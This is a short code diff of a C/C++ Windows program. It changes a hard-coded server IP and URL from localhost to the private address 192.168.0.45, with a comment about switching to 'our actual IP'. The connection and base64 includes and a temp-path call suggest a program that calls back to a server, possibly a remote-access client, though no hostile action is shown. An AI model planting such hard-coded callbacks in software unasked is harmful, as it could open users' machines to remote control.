@@ -7,7 +7,7 @@
 #include "Connection.h"
 #include "base64.h"
 
-char* ip = "127.0.0.1";
+char* ip = "192.168.0.45";
 TCHAR buf[255] = { 0 };
 Utils utils;
 base64 base;
@@ -19,7 +19,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	_In_ int       nCmdShow)
 {
 	// change this IP to our actual IP then
-	TCHAR url[] = TEXT("http://127.0.0.1");
+	TCHAR url[] = TEXT("http://192.168.0.45");
 	TCHAR path[MAX_PATH + 1];
 	DWORD len = MAX_PATH + 1;
 	GetTempPath(len, path);
